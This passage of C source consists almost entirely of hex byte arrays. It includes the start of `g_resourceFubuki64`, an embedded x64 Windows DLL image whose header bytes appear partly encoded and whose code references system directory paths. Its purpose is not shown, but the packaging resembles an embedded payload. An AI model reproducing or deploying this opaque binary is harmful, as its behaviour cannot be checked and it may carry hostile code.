	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0xB4, 0x00, 0x00, 0x00, 0x60, 0x31, 0x76, 0x31, 0x36, 0x32, 0x28, 0x33,
	0x33, 0x33, 0x42, 0x33, 0x5C, 0x33, 0x68, 0x33, 0x75, 0x33, 0x80, 0x33, 0x98, 0x33, 0xAF, 0x33,
	0x1B, 0x34, 0x4B, 0x34, 0x72, 0x34, 0xA4, 0x34, 0xC3, 0x34, 0xEC, 0x34, 0xF3, 0x34, 0x20, 0x35,
	0x50, 0x35, 0x56, 0x35, 0x64, 0x35, 0x9D, 0x35, 0x0F, 0x37, 0x1E, 0x37, 0x63, 0x37, 0x6D, 0x37,
	0x7D, 0x37, 0x8D, 0x37, 0x98, 0x38, 0xDD, 0x38, 0xE7, 0x38, 0xF7, 0x38, 0x07, 0x39, 0xC0, 0x39,
	0x4F, 0x3A, 0xAD, 0x3A, 0xBA, 0x3A, 0xD5, 0x3A, 0xE0, 0x3A, 0x39, 0x3B, 0x4E, 0x3B, 0x70, 0x3B,
	0x8E, 0x3B, 0x97, 0x3B, 0xB2, 0x3B, 0xBB, 0x3B, 0x4A, 0x3C, 0x5A, 0x3C, 0x7C, 0x3C, 0x9E, 0x3C,
	0xA4, 0x3C, 0xCF, 0x3C, 0xDB, 0x3C, 0xEB, 0x3C, 0xF8, 0x3C, 0x07, 0x3D, 0x2F, 0x3D, 0x4D, 0x3D,
	0x70, 0x3D, 0x7E, 0x3D, 0x99, 0x3D, 0xC8, 0x3D, 0x05, 0x3E, 0x1E, 0x3E, 0x40, 0x3E, 0x49, 0x3E,
	0x62, 0x3E, 0x73, 0x3E, 0x7E, 0x3E, 0x85, 0x3E, 0x95, 0x3E, 0xAE, 0x3E, 0xB5, 0x3E, 0xDF, 0x3E,
	0xF3, 0x3E, 0x09, 0x3F, 0x14, 0x3F, 0x22, 0x3F, 0x3C, 0x3F, 0x6C, 0x3F, 0x72, 0x3F, 0xD4, 0x3F,
	0xE4, 0x3F, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x4F, 0x30, 0x69, 0x30,
	0x77, 0x30, 0x88, 0x30, 0x9D, 0x30, 0x3C, 0x32, 0x5E, 0x32, 0x83, 0x32, 0x8F, 0x32, 0xA4, 0x32,
	0xE4, 0x32, 0xFF, 0x32, 0x0F, 0x33, 0x16, 0x33, 0x25, 0x33, 0x36, 0x33, 0x3D, 0x33, 0x44, 0x33,
	0x00, 0x34, 0x27, 0x34, 0x35, 0x34, 0x4D, 0x34, 0x52, 0x34, 0x73, 0x34, 0x86, 0x34, 0x98, 0x34,
	0xBE, 0x34, 0xC4, 0x34, 0xCD, 0x34, 0xD2, 0x34, 0xF1, 0x34, 0x10, 0x35, 0x37, 0x35, 0x3F, 0x35,
	0x5A, 0x35, 0x70, 0x35, 0x78, 0x35, 0x7E, 0x35, 0x90, 0x35, 0x37, 0x36, 0x79, 0x36, 0xF5, 0x36,
	0x16, 0x37, 0x28, 0x37, 0x4C, 0x37, 0x72, 0x37, 0xDC, 0x37, 0x15, 0x38, 0x41, 0x38, 0x7A, 0x38,
	0x9F, 0x38, 0xE7, 0x38, 0x15, 0x39, 0x73, 0x39, 0xE8, 0x39, 0xF5, 0x39, 0x16, 0x3A, 0x2D, 0x3A,
	0x36, 0x3A, 0x60, 0x3A, 0xC6, 0x3A, 0xD4, 0x3A, 0xEE, 0x3A, 0xF8, 0x3A, 0x04, 0x3B, 0x15, 0x3B,
	0x1F, 0x3B, 0x42, 0x3B, 0xB3, 0x3B, 0xBB, 0x3B, 0xD6, 0x3B, 0x08, 0x3C, 0x0D, 0x3C, 0x18, 0x3C,
	0x38, 0x3C, 0x81, 0x3C, 0x87, 0x3C, 0xA3, 0x3C, 0xAC, 0x3C, 0xC6, 0x3C, 0x1D, 0x3D, 0x35, 0x3D,
	0x3E, 0x3D, 0x7D, 0x3D, 0x87, 0x3D, 0xC2, 0x3D, 0xCF, 0x3D, 0xF2, 0x3D, 0x01, 0x3E, 0x10, 0x3E,
	0x19, 0x3E, 0x28, 0x3E, 0x31, 0x3E, 0x3B, 0x3E, 0x44, 0x3E, 0x6B, 0x3E, 0x75, 0x3E, 0xB0, 0x3E,
	0xB9, 0x3E, 0xC3, 0x3E, 0xC9, 0x3E, 0xD8, 0x3E, 0xE6, 0x3E, 0x0F, 0x3F, 0x1A, 0x3F, 0x24, 0x3F,
	0x2D, 0x3F, 0x74, 0x3F, 0x87, 0x3F, 0xA5, 0x3F, 0xB3, 0x3F, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00,
	0x24, 0x00, 0x00, 0x00, 0x61, 0x31, 0x98, 0x31, 0x9F, 0x31, 0xA4, 0x31, 0xA8, 0x31, 0xAC, 0x31,
	0xB0, 0x31, 0x06, 0x32, 0x4B, 0x32, 0x50, 0x32, 0x54, 0x32, 0x58, 0x32, 0x5C, 0x32, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

#ifdef _WIN64
static const unsigned char g_resourceFubuki64[29696] = {
	0xE6, 0xF1, 0x3B, 0xAB, 0xA8, 0xAB, 0xAB, 0xAB, 0xAF, 0xAB, 0xAB, 0xAB, 0x54, 0x54, 0xAB, 0xAB,
	0x13, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xEB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB,
	0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB,
	0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0x43, 0xAB, 0xAB, 0xAB,
	0xA5, 0xB4, 0x11, 0xA5, 0xAB, 0x1F, 0xA2, 0x66, 0x8A, 0x13, 0xAA, 0xE7, 0x66, 0x8A, 0xFF, 0xC3,
	0xC2, 0xD8, 0x8B, 0xDB, 0xD9, 0xC4, 0xCC, 0xD9, 0xCA, 0xC6, 0x8B, 0xC8, 0xCA, 0xC5, 0xC5, 0xC4,
	0xDF, 0x8B, 0xC9, 0xCE, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
	0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xA1, 0xE5, 0xD4, 0x8D, 0xE5, 0x84, 0xBA, 0xDE, 0xE5, 0x84, 0xBA, 0xDE, 0xE5, 0x84, 0xBA, 0xDE,
	0x91, 0x05, 0xBC, 0xDF, 0xE4, 0x84, 0xBA, 0xDE, 0x62, 0x0D, 0xB9, 0xDF, 0xE4, 0x84, 0xBA, 0xDE,
	0x62, 0x0D, 0xBE, 0xDF, 0xE4, 0x84, 0xBA, 0xDE, 0x91, 0x05, 0xBB, 0xDF, 0xEA, 0x84, 0xBA, 0xDE,
	0xE5, 0x84, 0xBB, 0xDE, 0x8C, 0x84, 0xBA, 0xDE, 0x6B, 0x0D, 0xB2, 0xDF, 0xF5, 0x84, 0xBA, 0xDE,
	0x6B, 0x0D, 0xBA, 0xDF, 0xE4, 0x84, 0xBA, 0xDE, 0x6B, 0x0D, 0xB8, 0xDF, 0xE4, 0x84, 0xBA, 0xDE,
	0x52, 0x69, 0x63, 0x68, 0xE5, 0x84, 0xBA, 0xDE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x04, 0x00,
	0x6A, 0xF0, 0xD4, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x20,
	0x0B, 0x02, 0x0E, 0x2C, 0x00, 0x2E, 0x00, 0x00, 0x00, 0x4A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x2C, 0x29, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
	0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0xCE, 0xEB, 0x00, 0x00, 0x02, 0x00, 0x60, 0x01, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
	0x80, 0x4A, 0x00, 0x00, 0xA8, 0x28, 0x00, 0x00, 0x28, 0x73, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0xD4, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC4, 0x45, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0xC0, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0xFD, 0x2D, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	0x00, 0x2E, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x04, 0x3D, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x3E, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
	0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x74, 0x08, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00,
	0x00, 0x02, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC0, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0xD4, 0x01, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x72, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4C,
	0x89, 0x70, 0x20, 0x4C, 0x8B, 0x5C, 0x24, 0x28, 0x33, 0xD2, 0x4D, 0x85, 0xDB, 0x74, 0x03, 0x41,
	0x89, 0x13, 0x48, 0x85, 0xC9, 0x75, 0x10, 0x4D, 0x85, 0xC0, 0x74, 0x04, 0x66, 0x41, 0x89, 0x10,
	0x33, 0xC0, 0xE9, 0x94, 0x00, 0x00, 0x00, 0xBE, 0x20, 0x00, 0x00, 0x00, 0x8B, 0xDA, 0x44, 0x8D,
	0x76, 0x02, 0x44, 0x8B, 0xD2, 0xEB, 0x04, 0x48, 0x83, 0xC1, 0x02, 0x44, 0x0F, 0xB7, 0x09, 0x66,
	0x44, 0x3B, 0xCE, 0x74, 0xF2, 0x66, 0x45, 0x85, 0xC9, 0x74, 0x53, 0x66, 0x45, 0x3B, 0xCE, 0x48,
	0x8D, 0x41, 0x02, 0x8B, 0xFE, 0x48, 0x0F, 0x44, 0xC8, 0x66, 0x41, 0x0F, 0x44, 0xFE, 0xEB, 0x27,
	0x66, 0x3B, 0xC7, 0x74, 0x2B, 0x66, 0x85, 0xC0, 0x74, 0x26, 0x41, 0xFF, 0xC2, 0x41, 0x81, 0xFA,
	0x04, 0x01, 0x00, 0x00, 0x73, 0x0D, 0x4D, 0x85, 0xC0, 0x74, 0x08, 0x66, 0x41, 0x89, 0x00, 0x49,
	0x83, 0xC0, 0x02, 0x48, 0x83, 0xC1, 0x02, 0x0F, 0xB7, 0x01, 0x66, 0x41, 0x3B, 0xC6, 0x75, 0xD0,
	0x66, 0x39, 0x11, 0x74, 0x04, 0x48, 0x83, 0xC1, 0x02, 0x83, 0xC3, 0x01, 0x74, 0x94, 0x4D, 0x85,
	0xC0, 0x74, 0x04, 0x66, 0x41, 0x89, 0x10, 0x4D, 0x85, 0xDB, 0x74, 0x03, 0x45, 0x89, 0x13, 0x41,
	0x81, 0xFA, 0x04, 0x01, 0x00, 0x00, 0x0F, 0x92, 0xC2, 0x8B, 0xC2, 0x48, 0x8B, 0x5C, 0x24, 0x08,
	0x48, 0x8B, 0x74, 0x24, 0x10, 0x48, 0x8B, 0x7C, 0x24, 0x18, 0x4C, 0x8B, 0x74, 0x24, 0x20, 0xC3,
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x4C,
	0x8B, 0xDA, 0x8B, 0xD1, 0x44, 0x8B, 0xD1, 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x83, 0xF9, 0x0A,
	0x72, 0x12, 0xB8, 0xCD, 0xCC, 0xCC, 0xCC, 0x49, 0xFF, 0xC0, 0xF7, 0xE2, 0xC1, 0xEA, 0x03, 0x83,
	0xFA, 0x0A, 0x73, 0xEE, 0x33, 0xF6, 0x4D, 0x85, 0xDB, 0x74, 0x4A, 0x4F, 0x8D, 0x0C, 0x00, 0x49,
	0x8B, 0xF8, 0x4D, 0x85, 0xC0, 0x74, 0x39, 0x49, 0x8D, 0x5B, 0xFE, 0x49, 0x03, 0xD9, 0xB8, 0xCD,
	0xCC, 0xCC, 0xCC, 0x41, 0xF7, 0xE2, 0xC1, 0xEA, 0x03, 0x0F, 0xB7, 0xC2, 0x66, 0xC1, 0xE0, 0x02,
	0x8D, 0x0C, 0x10, 0x66, 0x03, 0xC9, 0x66, 0x44, 0x2B, 0xD1, 0x66, 0x41, 0x83, 0xC2, 0x30, 0x66,
	0x44, 0x89, 0x13, 0x44, 0x8B, 0xD2, 0x48, 0x8D, 0x5B, 0xFE, 0x48, 0x83, 0xEF, 0x01, 0x75, 0xCE,
	0x66, 0x43, 0x89, 0x34, 0x19, 0x48, 0x8B, 0x5C, 0x24, 0x08, 0x49, 0x8B, 0xC0, 0x48, 0x8B, 0x74,
	0x24, 0x10, 0x48, 0x8B, 0x7C, 0x24, 0x18, 0xC3, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,
	0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x55, 0x48, 0x8D, 0x68, 0xA1, 0x48, 0x81, 0xEC, 0xA0,
	0x00, 0x00, 0x00, 0x33, 0xF6, 0xC7, 0x45, 0xE7, 0x5C, 0x00, 0x73, 0x00, 0x40, 0x8A, 0xFA, 0x66,
	0x89, 0x75, 0xEF, 0xBA, 0x30, 0x00, 0xFE, 0x7F, 0x66, 0x89, 0x75, 0x13, 0x66, 0x89, 0x75, 0x03,
	0x48, 0x8B, 0xD9, 0xC7, 0x45, 0xEB, 0x79, 0x00, 0x73, 0x00, 0xC7, 0x45, 0x07, 0x74, 0x00, 0x65,
	0x00, 0xC7, 0x45, 0x0B, 0x6D, 0x00, 0x33, 0x00, 0xC7, 0x45, 0x0F, 0x32, 0x00, 0x5C, 0x00, 0xC7,
	0x45, 0xF7, 0x77, 0x00, 0x6F, 0x00, 0xC7, 0x45, 0xFB, 0x77, 0x00, 0x36, 0x00, 0xC7, 0x45, 0xFF,
	0x34, 0x00, 0x5C, 0x00, 0xE8, 0x3B, 0x14, 0x00, 0x00, 0x48, 0x8D, 0x55, 0xE7, 0xE8, 0x86, 0x13,
	0x00, 0x00, 0x40, 0x84, 0xFF, 0x74, 0x39, 0x44, 0x8D, 0x4E, 0x40, 0x48, 0x89, 0x74, 0x24, 0x20,
	0x41, 0x8B, 0xC9, 0x48, 0x8D, 0x7D, 0x17, 0x33, 0xC0, 0x4C, 0x8D, 0x45, 0x17, 0xF3, 0xAA, 0x48,
	0x83, 0xC9, 0xFF, 0x4C, 0x89, 0x4D, 0x17, 0x33, 0xD2, 0xFF, 0x15, 0xE9, 0x2F, 0x00, 0x00, 0x85,
	0xC0, 0x78, 0x0D, 0x8B, 0x45, 0x4F, 0x48, 0x8D, 0x55, 0xF7, 0xD1, 0xE8, 0xA8, 0x01, 0x75, 0x04,
	0x48, 0x8D, 0x55, 0x07, 0x48, 0x8B, 0xCB, 0xE8, 0x3C, 0x13, 0x00, 0x00, 0x4C, 0x8D, 0x9C, 0x24,
	0xA0, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x10, 0x49, 0x8B, 0x73, 0x18, 0x49, 0x8B, 0x7B, 0x20,
	0x49, 0x8B, 0xE3, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x0F, 0xB7,
	0xC1, 0x4C, 0x8D, 0x54, 0x24, 0x34, 0xC1, 0xE0, 0x10, 0x41, 0xB1, 0x61, 0x0D, 0x41, 0x6C, 0x00,
	0x00, 0xC7, 0x44, 0x24, 0x58, 0xCB, 0x09, 0x06, 0x03, 0x89, 0x44, 0x24, 0x5C, 0x33, 0xDB, 0x4C,
	0x8B, 0x5C, 0x24, 0x58, 0x44, 0x8A, 0xC3, 0x66, 0xC7, 0x44, 0x24, 0x3E, 0x2D, 0x5F, 0x41, 0x8D,
	0x41, 0xE0, 0x41, 0x88, 0x42, 0xCC, 0x41, 0x8D, 0x48, 0x61, 0x41, 0x0F, 0xB6, 0xC0, 0x88, 0x4C,
	0x04, 0x1A, 0x41, 0x80, 0xF8, 0x0A, 0x73, 0x06, 0x80, 0xE9, 0x31, 0x41, 0x88, 0x0A, 0x41, 0xFE,
	0xC0, 0x49, 0xFF, 0xC2, 0x41, 0xFE, 0xC1, 0x41, 0x80, 0xF8, 0x1A, 0x7C, 0xD1, 0xB9, 0x0D, 0x00,
	0x00, 0x00, 0x49, 0x8B, 0xC3, 0x49, 0xC1, 0xEB, 0x05, 0x83, 0xE0, 0x3F, 0x0F, 0xBE, 0x04, 0x04,
	0x66, 0x89, 0x02, 0x48, 0x8D, 0x52, 0x02, 0x48, 0x83, 0xE9, 0x01, 0x75, 0xE5, 0x66, 0x89, 0x1A,
	0x48, 0x83, 0xC4, 0x40, 0x5B, 0xC3, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x78, 0x20, 0x55,
	0x48, 0x8D, 0x6C, 0x24, 0x80, 0x48, 0x81, 0xEC, 0x80, 0x01, 0x00, 0x00, 0x0F, 0x29, 0x70, 0xE8,
